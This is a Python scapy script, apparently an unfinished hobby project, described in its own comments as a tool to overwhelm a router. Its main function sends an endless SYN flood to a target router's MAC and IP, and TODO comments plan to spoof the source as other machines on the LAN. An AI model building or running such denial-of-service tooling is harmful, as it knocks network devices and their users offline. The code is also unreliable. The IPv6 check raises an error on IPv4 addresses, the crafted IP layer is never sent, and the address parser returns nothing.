from scapy.all import *
import argparse

# from icecream import ic

# Generates packets to overwhelm your router

# Determines if a given address is IPv4 or v6
def is_ipv6(address):
    return address.index(":") != -1


# Generates SYN flood
# TODO make this get the spoofed source (if possible)
def spam_router(router_mac, router_ip, interface):
    e = Ether(dst=router_mac)
    t = TCP(flags="S")
    i = IPv6() if is_ipv6(router_ip) else IP()
    i.dst = router_ip
    # continuously sends packets → creates flood
    # TODO add the iface (may be needed for wired LANs)
    sendp(e / IP() / t, loop=1, iface=interface)


# Finds MAC and IP addresses in the text files
def extract_hostname_info():
    with open("arp_query.txt") as fin:
        arp_lines = fin.readlines()
    with open("hostname_ARP.txt") as fin:
        hostname_lines = fin.readlines()
    split_arp_lines = []
    split_host_lines = []
    for host_line in hostname_lines:
        split_host_lines.append(host_line.split())
        # ic(host_line.split())
    for arp_line in arp_lines:
        # ic(arp_line.split())
        split_arp_lines.append(arp_line.split())
    # gets the IP and MAC address tuple for a given hostname
    # should get iface as well
    # basically, get all the information provided in the text file
    # Key: the hostname
    # Value: another dict with all other information
    hostname_info_dict = {}
    # TODO extract MAC and IP addresses with regex
    return hostname_info_dict


# If the length of the dictionary is more than 1,
# then the destination of the SYN flood could be
# a given devince on your LAN, and the source
# could be spoofed as another computer
def can_spoof(hostname_info_dict):
    return len(hostname_info_dict) > 1


def main():
    address_dict = extract_hostname_info()
    # TODO use extract MAC IP pair function to find
    # addresses of networked computers
    # spam_router()


if __name__ == "__main__":
    main()
